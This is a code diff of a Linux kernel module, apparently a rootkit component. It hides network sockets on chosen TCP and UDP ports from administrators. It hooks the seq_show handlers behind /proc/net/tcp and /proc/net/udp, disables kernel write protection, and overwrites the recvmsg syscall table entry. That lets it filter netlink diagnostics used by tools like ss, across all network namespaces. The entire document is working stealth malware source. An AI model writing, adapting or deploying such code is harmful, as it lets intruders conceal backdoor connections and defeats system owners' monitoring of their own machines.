@@ -1,206 +1,219 @@
-#include <linux/module.h>
-#include <linux/kernel.h>
-#include <linux/moduleparam.h>
-#include <linux/proc_fs.h>
-#include <../fs/proc/internal.h>
-#include <linux/fs.h>
-#include <linux/types.h>
-#include <linux/namei.h>
-#include <linux/seq_file.h>
-#include <net/tcp.h>
-#include <net/udp.h>
-#include <linux/netlink.h>
-#include <linux/inet_diag.h>
-#include <linux/socket.h>
-
-#include<linux/syscalls.h>
-#include<linux/unistd.h>
+#include<linux/moduleparam.h>
+#include<linux/module.h>
+#include<linux/proc_fs.h>
+#include<../fs/proc/internal.h> //proc_dir_entry
+#include<linux/fs.h>
+#include<linux/seq_file.h>
+#include<linux/namei.h>
 #include<linux/string.h>
+#include<linux/types.h>
+#include<net/tcp.h>
+#include<net/udp.h>
+#include<linux/netlink.h>
+#include<linux/inet_diag.h>
+#include<linux/socket.h>
+#include<linux/slab.h>
 
 #include "hooking.h"
-#include "socket_hiding.h"
 
-#define MAX_PORTC 1023
-#define TMPSZ 150
+#define MAX_PORTC 255
+#define in_tcplist(x) port_in_list(x, tcp_ports, tcp_portc)
+#define in_udplist(x) port_in_list(x, udp_ports, udp_portc)
 
-static int tcp_is_hidden = 0;
-static int udp_is_hidden = 0;
+static unsigned int tcp_ports[MAX_PORTC];
+static unsigned int udp_ports[MAX_PORTC];
+static int tcp_portc;
+static int udp_portc;
 
-struct proc_dir_entry *tcp_proc_entry;
-struct proc_dir_entry *udp_proc_entry;
+static int is_hidden = 0;
+static int rcount = 0;
 
-struct tcp_seq_afinfo * tcp_info;
-struct udp_seq_afinfo * udp_info;
+void ** udp_hook_ptr, **tcp_hook_ptr;
 
-static unsigned int  ports_tcp[MAX_PORTC];
-static unsigned int  ports_udp[MAX_PORTC];
-static int ports_tcp_num=0;
-static int ports_udp_num=0;
+module_param_array(tcp_ports, uint, &tcp_portc, 0);
+MODULE_PARM_DESC(tcp_ports, "Array of TCP ports");
+module_param_array(udp_ports, uint, &udp_portc, 0);
+MODULE_PARM_DESC(udp_ports, "Array of UDP ports");
 
-module_param_array(ports_tcp, int, &ports_tcp_num, 0);
-MODULE_PARM_DESC(ports_tcp, "Hidden tcp sockets with ports ...");
-module_param_array(ports_udp, int, &ports_udp_num, 0);
-MODULE_PARM_DESC(ports_udp, "Hidden udp sockets with ports ...");
+static int (*orig_tcp_seq_show)(struct seq_file*, void*);
+static int (*orig_udp_seq_show)(struct seq_file*, void*);
+static long (*orig_sys_recvmsg)(int, struct msghdr*, unsigned);
 
-int (*old_tcp_seq_show)(struct seq_file*, void *) = NULL;
-int (*old_udp_seq_show)(struct seq_file*, void *) = NULL;
-static int my_tcp_seq_show(struct seq_file *, void *);
-static int my_udp_seq_show(struct seq_file *, void *);
-
-struct proc_dir_entry * get_proc_dir_entry(const char *);
-
-long (*orig_sys_recvmsg)(int, struct msghdr __user *, unsigned);
-static long my_sys_recvmsg(int, struct msghdr __user *, unsigned);
-
-static void hide_udp(void);
-static void hide_udp(void);
-
-struct proc_dir_entry * get_proc_dir_entry(const char * name)
-{
-	struct path path;
-  struct proc_inode *proc_inode;
-	if(kern_path(name, 0, &path)){
-		return NULL;
-  }
-	proc_inode = container_of(path.dentry->d_inode, struct proc_inode, vfs_inode);
-  return proc_inode->pde;
-}
-
-// new seq_show, called for each "step" of a sequence
-static int my_tcp_seq_show(struct seq_file *s, void *v)
-{
-  char port[12];
-  int i, retval=old_tcp_seq_show(s, v);
-  if(v == SEQ_START_TOKEN){
-    return retval;
-  }
-  for(i=0; i<ports_tcp_num; i++){
-    sprintf(port,":%04X", ports_tcp[i]);
-    if(strnstr(s->buf+s->count-TMPSZ,port,TMPSZ))
-    {
-      s->count -= TMPSZ;
-      break;
-    }
-  }
-  return retval;
-}
-
-static int my_udp_seq_show(struct seq_file *s, void *v)
-{
-  char port[12];
-  int i, retval=old_udp_seq_show(s, v);
-  if(v == SEQ_START_TOKEN){
-    return retval;
-  }
-  for(i=0; i<ports_udp_num; i++){
-    sprintf(port,":%04X", ports_udp[i]);
-    if(strnstr(s->buf+s->count-TMPSZ,port,TMPSZ))
-    {
-      s->count -= 128;
-      break;
-    }
-  }
-  return retval;
-}
-
-
-static void hide_tcp(void){
-  tcp_proc_entry = get_proc_dir_entry("/proc/net/tcp");
-  if(tcp_proc_entry == NULL){
-    printk(KERN_INFO "Couldn't obtain tcp entry\n");
-  }
-  else{
-    tcp_info =(struct tcp_seq_afinfo *) tcp_proc_entry->data;
-    //oldOP = tcp_info->seq_ops;
-    old_tcp_seq_show = tcp_info->seq_ops.show;
-    tcp_info->seq_ops.show = my_tcp_seq_show;
-    tcp_is_hidden = 1;
-  }
-}
-
-static void hide_udp(void){
-  udp_proc_entry = get_proc_dir_entry("/proc/net/udp");
-  if(udp_proc_entry == NULL){
-    printk(KERN_INFO "Couldn't obtain udp entry\n");
-  }
-  else{
-    udp_info =(struct udp_seq_afinfo *) udp_proc_entry->data;
-    //oldOP = udp_info->seq_ops;
-    old_udp_seq_show = udp_info->seq_ops.show;
-    udp_info->seq_ops.show = my_udp_seq_show;
-    udp_is_hidden = 1;
-  }
-}
-
-static long my_sys_recvmsg(int fd, struct msghdr __user *msg, unsigned flags){
-  long retVal, msgLen;
-  struct socket * socket;
-  struct sock * sock;
-  struct nlmsghdr * nl, * nl2; 
-  struct inet_diag_msg * diag_msg; 
-  unsigned int des_port, src_port;
-  int i, err = 0;
-
-  retVal = orig_sys_recvmsg(fd, msg, flags);
-  if(tcp_is_hidden){
-    socket = sockfd_lookup(fd, &err);
-    if(socket!=NULL){
-      sock = socket -> sk;
-      // check if netlink
-      if(sock->sk_family == AF_NETLINK && sock->sk_protocol == NETLINK_INET_DIAG){
-        nl = (struct nlmsghdr *)msg->msg_iov->iov_base;
-        msgLen = msg->msg_iov->iov_len;
-
-        while(NLMSG_OK(nl, msgLen)){
-          nl2 =NLMSG_NEXT(nl, msgLen);
-moved:    diag_msg = NLMSG_DATA(nl);
-          src_port = htons(diag_msg->id.idiag_sport);
-          des_port = htons(diag_msg->id.idiag_dport);
-          for(i=0; i<ports_tcp_num; i++){
-            if(src_port == ports_tcp[i] || des_port == ports_tcp[i]){
-              retVal -= NLMSG_ALIGN(nl->nlmsg_len);
-              if(NLMSG_OK(nl2, msgLen)){
-                memmove(nl,nl2,msgLen);
-                goto moved;
-              }else{
-                //FIXME wenn 0, then ss prints EOF on netlink
-                printk(KERN_INFO "return %d\n", retVal);
-                return retVal;
-              }
-            }
-          }
-          nl = nl2;
-        }
-      }
-    }
-  }
-  return retVal;
-}
-
-void hide_socket(){
-  if(ports_tcp_num > 0){
-    hide_tcp();
-
-    disable_wp();
-    orig_sys_recvmsg = syscall_table[__NR_recvmsg];
-    syscall_table[__NR_recvmsg] = my_sys_recvmsg;
-    enable_wp();
-  }
-  if(ports_udp_num > 0){
-    hide_udp();
-  }
+static int port_in_list(unsigned int port, unsigned int list[], int count){
+	int i;
+	for(i = 0;i<count;i++){
+		if(port == list[i]) return 1;
+	}
+	return 0;
 } 
 
-void unhide_socket(void){
-	if(tcp_is_hidden == 1){
-    tcp_info->seq_ops.show = old_tcp_seq_show;
+static long my_sys_recvmsg(int fd, struct msghdr __user *msg, unsigned flags){
+	long lres, msglen;
+	struct socket * socket;
+	struct sock * sk;
+	struct msghdr * mmsg;
+	struct nlmsghdr * nlh, *nxt; //netlink message header struct
+	struct inet_diag_msg * diag_msg; 
+	int error = 0;
+	unsigned short sport, dport;
+	
+	rcount++;	
+	
+	lres =  orig_sys_recvmsg(fd, msg, flags);
+	
+	if(lres == 0) goto out;	
 
-    disable_wp();
-    syscall_table[__NR_recvmsg] = orig_sys_recvmsg;
-    enable_wp();
-  }
-	if(udp_is_hidden == 1){
-    udp_info->seq_ops.show = old_udp_seq_show;
-  }
+	if(is_hidden == 0) goto out;	
+	
+	socket = sockfd_lookup(fd, &error);
+	if(!error && socket == NULL){
+		goto out;
+	}
+	sk = socket->sk;
+
+	
+	//check if family (important) and protocol match (otherwise the cast might fail at some point?)
+	if(sk->sk_family == AF_NETLINK && sk->sk_protocol == NETLINK_INET_DIAG){ //that's a bingo!
+		mmsg = (struct msghdr * ) kmalloc(lres, GFP_KERNEL);
+		memset(mmsg, 0, lres);
+		
+		error = copy_from_user(mmsg, msg, lres);		
+		if(error > 0) return lres; //copy from user failed, can't access memory
+
+		if(mmsg->msg_iovlen == msg->msg_iovlen){ //prevent us from processing garbage (happens)
+			
+			msglen = mmsg->msg_iov->iov_len;
+
+			nlh = (struct nlmsghdr *) mmsg->msg_iov->iov_base;
+			
+			do{
+				diag_msg = NLMSG_DATA(nlh);
+				sport = htons(diag_msg->id.idiag_sport);
+				dport = htons(diag_msg->id.idiag_dport);
+		
+				//printk(KERN_INFO "s: %d\n", sport);
+				
+				if(in_tcplist(sport)){ //don't hide target ports...
+				//	printk(KERN_INFO "hiding port %d", sport);
+					
+					lres -= NLMSG_ALIGN((nlh)->nlmsg_len);
+					nxt = NLMSG_NEXT(nlh, msglen);
+					memmove(nlh, nxt, msglen); //shift entries
+				}
+				else{
+					nlh = NLMSG_NEXT(nlh, msglen);
+				}
+				//printk(KERN_INFO "---------------------------\n");
+				}while(NLMSG_OK(nlh, msglen));
+			if(lres == 0){// no valid message left
+				nlh = (struct nlmsghdr *) mmsg->msg_iov->iov_base;
+				nlh->nlmsg_seq = 123456;
+				nlh->nlmsg_type = NLMSG_DONE;
+				nlh->nlmsg_len = sizeof(struct nlmsghdr);
+				lres = sizeof(struct nlmsghdr);
+			}		
+
+			error = copy_to_user(msg->msg_iov->iov_base, mmsg->msg_iov->iov_base, lres);
+			kfree(mmsg);
+		}
+	} 
+out:	--rcount;
+	return lres;
 }
 
+static int my_tcp_seq_show(struct seq_file * m, void * v){
+	struct inet_sock * inet;
+	struct sock * sp = v;
+	struct tcp_iter_state *st;
+	__u16 srcp, dstp;	
+
+	if (v == SEQ_START_TOKEN){
+		return orig_tcp_seq_show(m, v);
+	}
+	else{
+		inet = inet_sk(sp);
+		srcp = ntohs(inet->inet_sport);
+		dstp = ntohs(inet->inet_dport);
+		if(in_tcplist(srcp) || in_tcplist(dstp)){
+			st = m->private;
+			st->num -= 1;
+			return 0;
+		}
+		return orig_tcp_seq_show(m,v);
+	}				
+			
+	return orig_tcp_seq_show(m, v);
+}
+
+static int my_udp_seq_show(struct seq_file * m, void * v){
+	struct inet_sock * inet;
+	struct sock * sp = v;
+	__u16 srcp, dstp;
+	
+	if (v == SEQ_START_TOKEN)
+		return orig_udp_seq_show(m,v);
+	else {
+		inet = inet_sk(sp);
+		srcp = ntohs(inet->inet_sport);
+		dstp = ntohs(inet->inet_dport);
+		
+		if(in_udplist(srcp) || in_udplist(dstp)){
+			return 0;
+		}
+		return orig_udp_seq_show(m,v);
+	}				
+			
+	return 0;
+}
+
+struct proc_dir_entry* get_pde_subdir(struct proc_dir_entry* pde, const char* name){
+	struct proc_dir_entry* result = pde->subdir;
+ 	while(result && strcmp(name, result->name)) {
+    		result = result->next;
+  	}
+  	return result;
+}
+
+
+
+void hide_sockets(void){
+	struct proc_dir_entry * net_dent, * tcp_dent, * udp_dent;
+	struct net * net_ns;
+	struct tcp_seq_afinfo * tcp_info;
+	struct udp_seq_afinfo * udp_info;
+	
+	list_for_each_entry(net_ns, &net_namespace_list, list){
+				
+		net_dent = net_ns->proc_net;
+		tcp_dent = get_pde_subdir(net_dent, "tcp");
+		udp_dent = get_pde_subdir(net_dent, "udp");
+		tcp_info = tcp_dent->data;
+		udp_info = udp_dent->data;
+
+		tcp_hook_ptr = (void**) &tcp_info->seq_ops.show;
+		orig_tcp_seq_show = *tcp_hook_ptr;
+		*tcp_hook_ptr = my_tcp_seq_show;
+
+		udp_hook_ptr = (void**) &udp_info->seq_ops.show;
+		orig_udp_seq_show = *udp_hook_ptr;
+		*udp_hook_ptr = my_udp_seq_show;
+  	}
+
+	disable_wp();
+	orig_sys_recvmsg = syscall_table[__NR_recvmsg];
+	syscall_table[__NR_recvmsg] = my_sys_recvmsg;
+	enable_wp();
+	is_hidden = 1;
+}
+
+
+
+void unhide_sockets(void){
+	*udp_hook_ptr = orig_udp_seq_show;
+	*tcp_hook_ptr = orig_tcp_seq_show;
+
+	disable_wp();
+	syscall_table[__NR_recvmsg] = orig_sys_recvmsg;
+	enable_wp();
+	is_hidden = 0;
+}
